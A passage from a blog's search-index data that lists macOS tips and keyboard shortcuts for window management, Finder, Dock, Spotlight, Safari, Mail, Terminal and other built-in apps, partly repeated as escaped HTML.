selected item in Finder. Mission Control / Window Management When a window is inactive, use the Command key to interact with it without making it active. Hold Control when pressing the Mission Control function key to only show the current app\u0026rsquo;s windows. Hold Command when pressing the Mission Control function key to show the desktop. Hold Option while double-clicking a window\u0026rsquo;s corner to expand the window to fill the screen. Option-Click to switch windows while hiding the previous app. Command-Option-Click to switch windows and hide all other apps. In the Command-Tab app switcher, press the Up or Down arrow keys (or the 1 key) on an app to view that app\u0026rsquo;s windows. In the Command-Tab app switcher, hold Option while switching to an app to un-minimize all its windows. Press ⌘` to cycle between windows of the foreground application. Press ⌃F4 to cycle between windows across all applications in the current desktop space. Drag a window to the top of the screen and push it against the top of the screen to enter Mission Control with that window selected. Press ⌥⌘W or hold Option while clicking the red close button, to close all of the foreground application\u0026rsquo;s open windows. Press ⌥⌘M, or hold Option while clicking the yellow minimize button, to minimize all of the foreground application\u0026rsquo;s open windows. Hold Option while clicking the green zoom button to fill the window to the screen instead of entering full-screen mode. When configuring Hot Corners in System Settings, hold any or all of Control, Option, Command, or Shift to only activate the corner while the selected keys are also held down. On a trackpad, use two fingers to double-tap (tap, not click) on an app\u0026rsquo;s Dock icon to show all of the app\u0026rsquo;s windows. Alternatively, perform the App Exposé trackpad gesture over an app\u0026rsquo;s Dock icon. Hold Option while resizing a window to resize from the center of the window. Hold Shift while resizing a window to lock the aspect ratio. Double-click a window\u0026rsquo;s border to resize that edge to fill the screen. Hold Option while double-clicking to expand both edges. In Mission Control, perform a scroll up over a group of app windows to reveal the individual windows. Press the Space bar while holding the pointer over any window to magnify it. In Mission Control, Option-click another desktop space to switch to that space while staying in Mission Control. In Mission Control, drag the application icon underneath the windows to move all of an app\u0026rsquo;s windows to another space. In Mission Control app window mode, press Tab and Shift-Tab to switch applications. If a window was minimized in a different space, hold Command while un-minimizing to restore it to the current space. Hold Option while un-minimizing a window to un-minimize all windows from that app. If an app has windows in multiple spaces, click the app\u0026rsquo;s Dock icon repeatedly to cycle through the spaces with that app\u0026rsquo;s windows. If keyboard shortcuts are enabled for switching desktop spaces, pressing a shortcut while clicking and holding a window will move the window to that space. In Stage Manager, hold Shift while clicking on a window to add that window to the current stage instead of replacing it. Function Keys Hold down Shift and Option when changing the volume or brightness to make smaller adjustments. Hold down Option while changing the brightness to quickly open Display settings, or while changing the volume to open Sound settings. Hold down Shift while changing the volume to audibly preview the volume level. When connected to an external display, hold down Control while changing the brightness to adjust the brightness of the non-active display. Press and hold down on the Mission Control function key to automatically exit Mission Control after letting go of the key. Menu Bar / Notification Center Hold Option while opening the Wi-Fi and Bluetooth menus to access extra options. Hold Command while dragging a menu bar icon to move it to a new position. Add new menu bar items by dragging icons from Control Center to the menu bar. Option-click the date/time in the menu bar to toggle Do Not Disturb. Right-click a widget to change its size. On a trackpad, swipe horizontally with two fingers over a notification to dismiss that notification. Finder After copying a file, press ⌥⌘V to move the file instead of pasting a copy of it. Press ⌃⌘N with multiple files selected to create a new folder with those items. Press Tab and Shift-Tab to navigate through files alphabetically, regardless of the current sort ordering (only in Icons and List view). Hold Option while activating Quick Look to immediately launch into full-screen view. After opening Quick Look with multiple files selected, press ⌘⏎ to display a grid view of all items. Use the arrow keys to navigate and press Return to select an item to focus on. In Quick Look, right-click on the \u0026ldquo;Open with\u0026rdquo; button to select a different app to use to open the file. In Columns view, hold Option while resizing a column to simultaneously resize all columns. In Columns view, double-click a column separator to auto-resize that column. Hold Option while double-clicking on any separator to auto-resize all columns. In Columns view, click the empty space at the bottom of a folder to go to the parent folder. In Columns view, and when in a deeply nested file, press Shift-Tab and Tab to navigate through the parent directories without losing the path to the file. Hold Option while dragging a file to make a new copy instead of moving the original. Hold Command and Option to create an alias to the file. In List view, press ⌘+ and ⌘- to increase and decrease the row size. In List view, press ⌥↑ and ⌥↓ to select the top-most and bottom-most item. In List view, use the Left and Right arrow keys to collapse and expand directories. When a file is selected, press the Left arrow key to jump to the parent folder. Press ⌘I to show the inspector for the current file. Press ⌥⌘I to show a floating inspector that updates with the selected file. Press ⌥⌘C to copy the full pathname of the currently selected file. Press ⇧⌘. to toggle showing hidden files. Press ⌥⌘⌫ to immediately delete a file without sending it to the Trash. Merge folders by holding Option while dragging one folder on top of another folder. Set a custom icon for a folder by copying the new icon, inspecting the folder (⌘I), and pasting the icon by selecting the folder icon in the upper-left of the inspector window and pressing ⌘V. Drag selected text into a Finder window to quickly create and save a text clipping. (Text clippings are text files that can\u0026rsquo;t be edited and don\u0026rsquo;t require a filename to be saved.) Press ⌥⌘O to open the selected file and automatically close the Finder window. Press ⌥⇧⌘V to paste an item while preserving the file permission flags. Hold Command while dragging an icon in Icon view to align it to a grid. Restart Finder by holding Option while right-clicking the Finder dock icon and selecting Relaunch. Drag a folder to the new tab button (only visible if multiple tabs are already open) to open the folder in a new tab. Press ⌃⌘↑ to open the parent folder in a new window. If the toolbar is hidden (⌥⌘T), Finder will open folders in a new window. Press ⌘R with an image selected to rotate it clockwise, and ⌘L to rotate it counter-clockwise. Dock Press ⌥⌘D to hide and show the dock. Press ⌃F3 to move keyboard focus to the Dock. Then use the Left and Right arrow keys to select an app, or type the first few letters of an app. Press Enter to open the selected app, or press the Up arrow key to open the app\u0026rsquo;s menu. Hold Control and Shift while mousing over the Dock to temporarily turn on magnification. Quickly move the Dock to a different side of the screen by holding Shift while dragging the resize handle. Hold Option while resizing the Dock to resize in multiples of 16 points. Hold Option and Command while clicking a running app\u0026rsquo;s Dock icon to hide all other applications. Open a file in a specific application by dragging the file to the application\u0026rsquo;s Dock icon. If the application doesn\u0026rsquo;t accept the file type by default, force open the file by holding Option and Command while dragging the file. If a dock icon is bouncing repeatedly, stop the bouncing by mousing over the icon. Hold Control and Command when right-clicking a Dock icon to only see the default system menu options. Hold Option and Command when clicking on a folder in the Dock to open the folder in a new Finder window. To open multiple items from a stack, hold Option while selecting an item to open it in the background while keeping the stack open. After opening a stack, hover the cursor over an item and press the Space bar to preview the item with quick look. Right-click the Launchpad dock icon to open an app from an inline menu. In Launchpad, hold Option to enter \u0026ldquo;jiggle mode\u0026rdquo; to re-arrange and delete apps. To add AirDrop to the Dock, navigate to /System/Library/CoreServices/Finder.app/Contents/Applications in Finder and drag the AirDrop icon to the Dock. Spotlight Press ⌘B to search the web for the current query. Press ⌘C to copy the full path to the selected file, or to copy the result of the current calculation. Press ⌘D to open the Dictionary app with the current query. Press ⌘L to jump to the dictionary section in the results (if present). Press ⌘⏎ or ⌘R to reveal the selected file in Finder. Use the name: filter to only search in the filename. Add kind:folder to only search for folder names. Hold Command to show the path to the currently selected file. Safari Tab groups organize tabs spatially. Use ⌥⌘{↑,↓,←,→} to navigate tabs in 2D space. When a video is playing, right click the speaker icon in the address bar or tab to enter Picture-in-Picture (PiP) mode. Hold Option while closing a tab to close all other tabs except the current tab. Click and hold the back button to see recent browsing history. Hold Option to see page URLs instead of page titles. Drag selected text onto the Safari dock icon to quickly search the web for that text. Press ⇧⌘T to re-open the most recently closed tab or window. Click and hold on the new tab icon in the toolbar to view recently closed tabs. Press the Space bar at the beginning of the address bar to change the search engine and to see recent web searches. Add kind:bookmark to Spotlight searches to search Safari bookmarks and browsing history. Shift-click a link to add it to Reading List. Click and hold a bookmark in the bookmarks bar to edit its display title. Option-click the reload icon or press ⌥⌘R to force a fresh reload of the current webpage. Right-click the reader icon in the address bar to automatically turn on Reader Mode for all pages on the current website. After performing a web search and opening a result in the same tab, press ⌥⌘S to go back to the search results page. Press ⇧⌘I to create a new email message with the contents of the current page. Hold Option over the History \u0026gt; Clear History menu item to only clear browsing history while preserving website data. Press ⌃⌘D while hovering over a link to open an inline preview of the link. Mail Command-click multiple mailboxes in the left sidebar to simultaneously view all messages from the selected mailboxes. Select part of a message\u0026rsquo;s text before replying or forwarding to only include the selected text in the new message. Drag a file to the Mail dock icon to compose a new message with the file already attached. Press ⌥⇧⌘N to create a new tab. Press the Space bar at the end of a message to go to the next message. Hold Shift while pressing the Space bar at the top of a message to go to the previous message. Start typing the first few characters of the sender, subject, or body to jump to that message in the messages list. Press ⌥⌘↑ and ⌥⌘↓ to jump to the top-most or bottom-most message in the messages list. Save an extra copy of an important message by dragging it to the Finder. If a message bounces, use Message \u0026gt; Send Again on the bounced message to re-send it to a different address. To add a message to multiple folders, hold Command while dragging the message to each folder. Press ⇧⌘C to assign a color to a message. Drag a message into the Notes or Reminders app to add a link to the message. Press ⌘R and ⇧⌘R while replying to a message to switch between reply and reply-all. Press ⌥⌫ to delete a message without automatically opening the next message. Command-click on the currently selected message to unselect it. If a message has already been replied to, click on the reply icon in the message list to open the reply in a new window. When creating a new mailbox, add a forward slash to create a nested mailbox. After performing a search, select a mailbox from the left sidebar to filter the search to that mailbox. Hold Shift while launching Mail to reset the index. Preview Press ` to bring up a magnifier, and then press + and - to resize it. In a PDF document, re-order the pages in the document by re-ordering the pages in the sidebar. Merge two PDF documents by dragging pages from one document\u0026rsquo;s sidebar to the other document\u0026rsquo;s sidebar. In the save dialog for an image, hold Option while opening the Format menu to access an extended list of formats. Hold Option and the Space bar to activate the pan tool. Hold Option while in text selection mode to switch to rectangular text selection. Calendar Hold Shift while dragging an event to set a more precise time instead of snapping to 15-minute intervals. Click and hold the Accept button in a calendar invite to change which calendar the event is accepted to. Hold Option while pressing the Accept button in a calendar invite to accept all events. Hold Command while clicking any calendar\u0026rsquo;s checkbox in the left sidebar to show or hide all calendars. Hold Command and Option while clicking a calendar\u0026rsquo;s checkbox to only show that calendar. Add kind:event to Spotlight searches to search calendar events. Resize the mini-calendar in the bottom-left to preview more months. With an event selected, press ⌃⌥↑ and ⌃⌥↓ to adjust the time of the event. This also works with multiple events selected. In Week view, press ⌥⌘← and ⌥⌘→ to shift the view by a single day. Messages Press ⌘R to directly reply to the latest message in the conversation. Press ⇧⌘R to reply to the latest thread in the conversation. Press ⌘T to bring up the tapback selector for the latest message. Use the 1-6 number keys to select a reaction. Press ⌘E to edit the latest sent message. Press ⌥↑ and ⌥↓ in the message input field to cycle through previously sent messages. Press ⌘1-9 to jump to a pinned conversation. Right-click on a message and select Show Times to view exact timestamps for each message. Right-click the Messages icon in the Dock to quickly view and jump to unread conversations. Photos Drag an item to the \u0026ldquo;My Albums\u0026rdquo; header section to quickly create an album with that item. After adding an item to an album, use ⌃⌘A to add other items to that same album. When editing an image, hold down the M key to compare the modifications to the original. Hold Option while launching Photos to choose a different photo library to open. Drag a photo from the Photos app into a Finder window to quickly export the photo, or into the Mail or Messages app to attach the photo. When editing an image, double-click an adjustment slider to reset it. When editing an image, hold Option while holding the pointer over an adjustment slider to extend the adjustment range. Hold Option while clicking the rotate button to reverse the rotation direction. Hold Shift while cropping a photo to maintain the current aspect ratio, and hold Option to crop from the center of the photo. TextEdit In rich text mode, press Option-Tab to insert an outlined list. Press Option-Escape to autocomplete the current word. Press ⌃⌥⌘P in the find text field (⌘F) to access special search tokens. Hold Option while selecting text to make vertical text selections. The select line dialog (⌘L) supports the following formats: 1-3 selects lines 1-3 in the document +2 selects the 2nd line below the cursor -2 selects the 2nd line above the cursor +2-4 selects 3 lines, starting from 2 lines below the cursor -2-4 selects 3 lines, starting from 2 lines above the cursor Terminal Press ⇧⌘A to select the output from the previous command. Press ⌘L to clear the output from the previous command. Press ⌃⌘V to paste and format text that is properly escaped for the shell. Press ⌃T while a command is executing to view runtime statistics about the execution so far. Press ⌘{↑,↓} to select the previous/next commands. Then press ⇧⌘A to select the output of the currently selected command. Press ⇧⌘I to set a title for the current window and tab. Drag a file or folder into a Terminal window to insert its full path. Alternatively, copy a file or folder in Finder and paste it in Terminal to insert its path. Calculator Press ⌘T to open a new window that keeps a running history of calculations. Press ⌘R to enable Reverse Polish notation (RPN) mode. Press p to insert pi. Right-click the number display and select \u0026ldquo;Large Type\u0026rdquo; to view the current result in a large overlay window. Use the Convert menu to perform various unit conversions. In Programmer view (⌘3), click the individual binary bits to toggle between 0 and 1. QuickTime Player Grab a single frame from a video by pausing on the desired frame (using the Left and Right arrow keys to navigate individual frames) and pressing ⌘C. Photo Booth Hold Option while taking a picture to skip the countdown. Hold Shift while taking a picture to disable the screen flash. When choosing one of the distortion effects (on the third page), click and drag the cursor on the image preview to change the effects origin. ","date":"March 7, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2025/20250307-macos-tips/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://saurabhs.org/macos-tips\" target=\"_blank\" rel=\"noopener\"\u003emacOS Tips \u0026amp; Tricks\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"general\"\u003eGeneral\u003c/h3\u003e\n\u003ch4 id=\"native-ui-conventions\"\u003eNative UI Conventions\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003ePress ⇧⌘/ to search all of the current app\u0026rsquo;s menu items. Then use the Up/Down arrow keys to navigate the results and press \u003ccode\u003eReturn\u003c/code\u003e to execute that menu bar action.\u003c/li\u003e\n\u003cli\u003ePress ⌃F2 to move keyboard focus to the application\u0026rsquo;s menu bar. Start typing the first few letters of a menu title to jump to that menu.\u003c/li\u003e\n\u003cli\u003eHold the \u003ccode\u003eOption\u003c/code\u003e key while expanding an outline view to recursively expand all children. (The easiest place to test this is in Finder\u0026rsquo;s List view.)\u003c/li\u003e\n\u003cli\u003eOn modal dialogs/sheets, press \u003ccode\u003eCommand\u003c/code\u003e + the first letter of the button to press that button. ⌘. is the shortcut equivalent of the \u003ccode\u003eEscape\u003c/code\u003e key.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eControl\u003c/code\u003e and \u003ccode\u003eOption\u003c/code\u003e while clicking on a window to switch focus to that window without raising it.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eCommand\u003c/code\u003e while dragging a toolbar icon to move it to a new position.\u003c/li\u003e\n\u003cli\u003eBy default, clicking inside a scroll bar will scroll partially towards the clicked location. Hold \u003ccode\u003eOption\u003c/code\u003e while clicking in the scroll bar to jump directly to the clicked location.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while dragging the scroller to slowly scroll.\u003c/li\u003e\n\u003cli\u003eIn a scroll view, use the Up/Down keys to scroll in small increments. Hold \u003ccode\u003eOption\u003c/code\u003e to scroll in larger increments, and hold \u003ccode\u003eCommand\u003c/code\u003e to scroll to the beginning or end.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while pressing the Page Up/Page Down keys to also move the cursor while scrolling.\u003c/li\u003e\n\u003cli\u003eIn a text field that treats the Tab key as an input, press \u003ccode\u003eControl-Tab\u003c/code\u003e and \u003ccode\u003eControl-Shift-Tab\u003c/code\u003e to move focus to the previous or next control.\u003c/li\u003e\n\u003cli\u003ePress ⌃⌘D while holding the pointer over a word to view an inline dictionary definition of the word.\u003c/li\u003e\n\u003cli\u003ePress ⌃F6 to move focus to a floating window.\u003c/li\u003e\n\u003cli\u003eTo quickly find text, select some text and press ⌘E followed by ⌘G.\u003c/li\u003e\n\u003cli\u003ePress ⌃⌫ to delete only the accent mark from the previous character (e.g. é will become e).\u003c/li\u003e\n\u003cli\u003eIn Fonts windows, enter \u003ccode\u003e*X\u003c/code\u003e to scale the current font size, e.g. \u003ccode\u003e*1.5\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eWhen entering text, press ⌥⇧K (on U.S. keyboards) to insert an Apple logo.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eCommand\u003c/code\u003e while dragging a Picture-in-Picture (PiP) video player to move it anywhere without having it snap to one of the screen corners.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"screenshots\"\u003eScreenshots\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003eAfter pressing ⇧⌘4 and while drawing the screen capture area, hold \u003ccode\u003eOption\u003c/code\u003e while resizing to resize from the center, and hold \u003ccode\u003eShift\u003c/code\u003e while resizing to adjust only one axis. After drawing the area, hold the Space bar and drag to move the selected area.\u003c/li\u003e\n\u003cli\u003eAfter pressing ⇧⌘4, hold \u003ccode\u003eControl\u003c/code\u003e while taking the screenshot to copy to the clipboard instead of saving to file.\u003c/li\u003e\n\u003cli\u003eAfter pressing ⇧⌘4, press the Space bar to select a window to screenshot. Hold down \u003ccode\u003eOption\u003c/code\u003e while taking the screenshot to remove the window\u0026rsquo;s shadow.\u003c/li\u003e\n\u003cli\u003eRight click on the floating screenshot preview to access additional actions.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"opensave-dialogs\"\u003eOpen/Save Dialogs\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003eDrag a file or folder from Finder into an open/save dialog to jump directly to that file.\u003c/li\u003e\n\u003cli\u003eIn save dialogs, press ⌘= to switch between the compact and expanded layout.\u003c/li\u003e\n\u003cli\u003eIn save dialogs, press ⌘⌫ to activate the Delete button, ⌘D to activate the Don\u0026rsquo;t Save button, and ⌘. (or \u003ccode\u003eEsc\u003c/code\u003e) to activate the Cancel button.\u003c/li\u003e\n\u003cli\u003ePress \u003ccode\u003e~\u003c/code\u003e to open a Go To File dialog prefilled with the home directory. Press \u003ccode\u003e/\u003c/code\u003e to open it prefilled with the root directory.\u003c/li\u003e\n\u003cli\u003ePress ⌘R to reveal the selected item in Finder.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"mission-control--window-management\"\u003eMission Control / Window Management\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003eWhen a window is inactive, use the \u003ccode\u003eCommand\u003c/code\u003e key to interact with it without making it active.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eControl\u003c/code\u003e when pressing the Mission Control function key to only show the current app\u0026rsquo;s windows.\nHold \u003ccode\u003eCommand\u003c/code\u003e when pressing the Mission Control function key to show the desktop.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while double-clicking a window\u0026rsquo;s corner to expand the window to fill the screen.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eOption\u003c/code\u003e-Click to switch windows while hiding the previous app. \u003ccode\u003eCommand-Option\u003c/code\u003e-Click to switch windows and hide all other apps.\u003c/li\u003e\n\u003cli\u003eIn the Command-Tab app switcher, press the Up or Down arrow keys (or the 1 key) on an app to view that app\u0026rsquo;s windows.\u003c/li\u003e\n\u003cli\u003eIn the Command-Tab app switcher, hold \u003ccode\u003eOption\u003c/code\u003e while switching to an app to un-minimize all its windows.\u003c/li\u003e\n\u003cli\u003ePress ⌘` to cycle between windows of the foreground application.\u003c/li\u003e\n\u003cli\u003ePress ⌃F4 to cycle between windows across all applications in the current desktop space.\u003c/li\u003e\n\u003cli\u003eDrag a window to the top of the screen and push it against the top of the screen to enter Mission Control with that window selected.\u003c/li\u003e\n\u003cli\u003ePress ⌥⌘W or hold \u003ccode\u003eOption\u003c/code\u003e while clicking the red close button, to close \u003cem\u003eall\u003c/em\u003e of the foreground application\u0026rsquo;s open windows.\u003c/li\u003e\n\u003cli\u003ePress ⌥⌘M, or hold \u003ccode\u003eOption\u003c/code\u003e while clicking the yellow minimize button, to minimize \u003cem\u003eall\u003c/em\u003e of the foreground application\u0026rsquo;s open windows.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while clicking the green zoom button to fill the window to the screen instead of entering full-screen mode.\u003c/li\u003e\n\u003cli\u003eWhen configuring Hot Corners in System Settings, hold any or all of \u003ccode\u003eControl\u003c/code\u003e, \u003ccode\u003eOption\u003c/code\u003e, \u003ccode\u003eCommand\u003c/code\u003e, or \u003ccode\u003eShift\u003c/code\u003e to only activate the corner while the selected keys are also held down.\u003c/li\u003e\n\u003cli\u003eOn a trackpad, use two fingers to double-tap (\u003cem\u003etap\u003c/em\u003e, not click) on an app\u0026rsquo;s Dock icon to show all of the app\u0026rsquo;s windows. Alternatively, perform the App Exposé trackpad gesture over an app\u0026rsquo;s Dock icon.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while resizing a window to resize from the center of the window.\nHold \u003ccode\u003eShift\u003c/code\u003e while resizing a window to lock the aspect ratio.\u003c/li\u003e\n\u003cli\u003eDouble-click a window\u0026rsquo;s border to resize that edge to fill the screen. Hold \u003ccode\u003eOption\u003c/code\u003e while double-clicking to expand both edges.\u003c/li\u003e\n\u003cli\u003eIn Mission Control, perform a scroll up over a group of app windows to reveal the individual windows. Press the Space bar while holding the pointer over any window to magnify it.\u003c/li\u003e\n\u003cli\u003eIn Mission Control, Option-click another desktop space to switch to that space while staying in Mission Control.\u003c/li\u003e\n\u003cli\u003eIn Mission Control, drag the application icon underneath the windows to move all of an app\u0026rsquo;s windows to another space.\u003c/li\u003e\n\u003cli\u003eIn Mission Control app window mode, press \u003ccode\u003eTab\u003c/code\u003e and \u003ccode\u003eShift-Tab\u003c/code\u003e to switch applications.\u003c/li\u003e\n\u003cli\u003eIf a window was minimized in a different space, hold \u003ccode\u003eCommand\u003c/code\u003e while un-minimizing to restore it to the current space.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while un-minimizing a window to un-minimize all windows from that app.\u003c/li\u003e\n\u003cli\u003eIf an app has windows in multiple spaces, click the app\u0026rsquo;s Dock icon repeatedly to cycle through the spaces with that app\u0026rsquo;s windows.\u003c/li\u003e\n\u003cli\u003eIf keyboard shortcuts are enabled for switching desktop spaces, pressing a shortcut while clicking and holding a window will move the window to that space.\u003c/li\u003e\n\u003cli\u003eIn Stage Manager, hold \u003ccode\u003eShift\u003c/code\u003e while clicking on a window to add that window to the current stage instead of replacing it.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"function-keys\"\u003eFunction Keys\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003eHold down \u003ccode\u003eShift\u003c/code\u003e and \u003ccode\u003eOption\u003c/code\u003e when changing the volume or brightness to make smaller adjustments.\u003c/li\u003e\n\u003cli\u003eHold down \u003ccode\u003eOption\u003c/code\u003e while changing the brightness to quickly open Display settings, or while changing the volume to open Sound settings.\u003c/li\u003e\n\u003cli\u003eHold down \u003ccode\u003eShift\u003c/code\u003e while changing the volume to audibly preview the volume level.\u003c/li\u003e\n\u003cli\u003eWhen connected to an external display, hold down \u003ccode\u003eControl\u003c/code\u003e while changing the brightness to adjust the brightness of the non-active display.\u003c/li\u003e\n\u003cli\u003ePress and hold down on the Mission Control function key to automatically exit Mission Control after letting go of the key.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"menu-bar--notification-center\"\u003eMenu Bar / Notification Center\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while opening the Wi-Fi and Bluetooth menus to access extra options.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eCommand\u003c/code\u003e while dragging a menu bar icon to move it to a new position.\u003c/li\u003e\n\u003cli\u003eAdd new menu bar items by dragging icons from Control Center to the menu bar.\u003c/li\u003e\n\u003cli\u003eOption-click the date/time in the menu bar to toggle Do Not Disturb.\u003c/li\u003e\n\u003cli\u003eRight-click a widget to change its size.\u003c/li\u003e\n\u003cli\u003eOn a trackpad, swipe horizontally with two fingers over a notification to dismiss that notification.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"finder\"\u003eFinder\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eAfter copying a file, press ⌥⌘V to move the file instead of pasting a copy of it.\u003c/li\u003e\n\u003cli\u003ePress ⌃⌘N with multiple files selected to create a new folder with those items.\u003c/li\u003e\n\u003cli\u003ePress \u003ccode\u003eTab\u003c/code\u003e and \u003ccode\u003eShift-Tab\u003c/code\u003e to navigate through files alphabetically, regardless of the current sort ordering (only in Icons and List view).\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while activating Quick Look to immediately launch into full-screen view.\u003c/li\u003e\n\u003cli\u003eAfter opening Quick Look with multiple files selected, press ⌘⏎ to display a grid view of all items. Use the arrow keys to navigate and press Return to select an item to focus on.\u003c/li\u003e\n\u003cli\u003eIn Quick Look, right-click on the \u0026ldquo;Open with\u0026rdquo; button to select a different app to use to open the file.\u003c/li\u003e\n\u003cli\u003eIn Columns view, hold \u003ccode\u003eOption\u003c/code\u003e while resizing a column to simultaneously resize all columns.\u003c/li\u003e\n\u003cli\u003eIn Columns view, double-click a column separator to auto-resize that column. Hold \u003ccode\u003eOption\u003c/code\u003e while double-clicking on any separator to auto-resize all columns.\u003c/li\u003e\n\u003cli\u003eIn Columns view, click the empty space at the bottom of a folder to go to the parent folder.\u003c/li\u003e\n\u003cli\u003eIn Columns view, and when in a deeply nested file, press \u003ccode\u003eShift-Tab\u003c/code\u003e and \u003ccode\u003eTab\u003c/code\u003e to navigate through the parent directories without losing the path to the file.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while dragging a file to make a new copy instead of moving the original. Hold \u003ccode\u003eCommand\u003c/code\u003e and \u003ccode\u003eOption\u003c/code\u003e to create an alias to the file.\u003c/li\u003e\n\u003cli\u003eIn List view, press ⌘+ and ⌘- to increase and decrease the row size.\u003c/li\u003e\n\u003cli\u003eIn List view, press ⌥↑ and ⌥↓ to select the top-most and bottom-most item.\u003c/li\u003e\n\u003cli\u003eIn List view, use the Left and Right arrow keys to collapse and expand directories. When a file is selected, press the Left arrow key to jump to the parent folder.\u003c/li\u003e\n\u003cli\u003ePress ⌘I to show the inspector for the current file.\nPress ⌥⌘I to show a floating inspector that updates with the selected file.\u003c/li\u003e\n\u003cli\u003ePress ⌥⌘C to copy the full pathname of the currently selected file.\u003c/li\u003e\n\u003cli\u003ePress ⇧⌘. to toggle showing hidden files.\u003c/li\u003e\n\u003cli\u003ePress ⌥⌘⌫ to immediately delete a file without sending it to the Trash.\u003c/li\u003e\n\u003cli\u003eMerge folders by holding \u003ccode\u003eOption\u003c/code\u003e while dragging one folder on top of another folder.\u003c/li\u003e\n\u003cli\u003eSet a custom icon for a folder by copying the new icon, inspecting the folder (⌘I), and pasting the icon by selecting the folder icon in the upper-left of the inspector window and pressing ⌘V.\u003c/li\u003e\n\u003cli\u003eDrag selected text into a Finder window to quickly create and save a text clipping. (Text clippings are text files that can\u0026rsquo;t be edited and don\u0026rsquo;t require a filename to be saved.)\u003c/li\u003e\n\u003cli\u003ePress ⌥⌘O to open the selected file \u003cem\u003eand\u003c/em\u003e automatically close the Finder window.\u003c/li\u003e\n\u003cli\u003ePress ⌥⇧⌘V to paste an item while preserving the file permission flags.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eCommand\u003c/code\u003e while dragging an icon in Icon view to align it to a grid.\u003c/li\u003e\n\u003cli\u003eRestart Finder by holding \u003ccode\u003eOption\u003c/code\u003e while right-clicking the Finder dock icon and selecting Relaunch.\u003c/li\u003e\n\u003cli\u003eDrag a folder to the new tab button (only visible if multiple tabs are already open) to open the folder in a new tab.\u003c/li\u003e\n\u003cli\u003ePress ⌃⌘↑ to open the parent folder in a new window.\u003c/li\u003e\n\u003cli\u003eIf the toolbar is hidden (⌥⌘T), Finder will open folders in a new window.\u003c/li\u003e\n\u003cli\u003ePress ⌘R with an image selected to rotate it clockwise, and ⌘L to rotate it counter-clockwise.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"dock\"\u003eDock\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003ePress ⌥⌘D to hide and show the dock.\u003c/li\u003e\n\u003cli\u003ePress ⌃F3 to move keyboard focus to the Dock. Then use the Left and Right arrow keys to select an app, or type the first few letters of an app. Press \u003ccode\u003eEnter\u003c/code\u003e to open the selected app, or press the Up arrow key to open the app\u0026rsquo;s menu.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eControl\u003c/code\u003e and \u003ccode\u003eShift\u003c/code\u003e while mousing over the Dock to temporarily turn on magnification.\u003c/li\u003e\n\u003cli\u003eQuickly move the Dock to a different side of the screen by holding \u003ccode\u003eShift\u003c/code\u003e while dragging the resize handle.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while resizing the Dock to resize in multiples of 16 points.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e and \u003ccode\u003eCommand\u003c/code\u003e while clicking a running app\u0026rsquo;s Dock icon to hide all other applications.\u003c/li\u003e\n\u003cli\u003eOpen a file in a specific application by dragging the file to the application\u0026rsquo;s Dock icon. If the application doesn\u0026rsquo;t accept the file type by default, force open the file by holding \u003ccode\u003eOption\u003c/code\u003e and \u003ccode\u003eCommand\u003c/code\u003e while dragging the file.\u003c/li\u003e\n\u003cli\u003eIf a dock icon is bouncing repeatedly, stop the bouncing by mousing over the icon.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eControl\u003c/code\u003e and \u003ccode\u003eCommand\u003c/code\u003e when right-clicking a Dock icon to only see the default system menu options.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e and \u003ccode\u003eCommand\u003c/code\u003e when clicking on a folder in the Dock to open the folder in a new Finder window.\u003c/li\u003e\n\u003cli\u003eTo open multiple items from a stack, hold \u003ccode\u003eOption\u003c/code\u003e while selecting an item to open it in the background while keeping the stack open.\u003c/li\u003e\n\u003cli\u003eAfter opening a stack, hover the cursor over an item and press the Space bar to preview the item with quick look.\u003c/li\u003e\n\u003cli\u003eRight-click the Launchpad dock icon to open an app from an inline menu.\u003c/li\u003e\n\u003cli\u003eIn Launchpad, hold \u003ccode\u003eOption\u003c/code\u003e to enter \u0026ldquo;jiggle mode\u0026rdquo; to re-arrange and delete apps.\u003c/li\u003e\n\u003cli\u003eTo add AirDrop to the Dock, 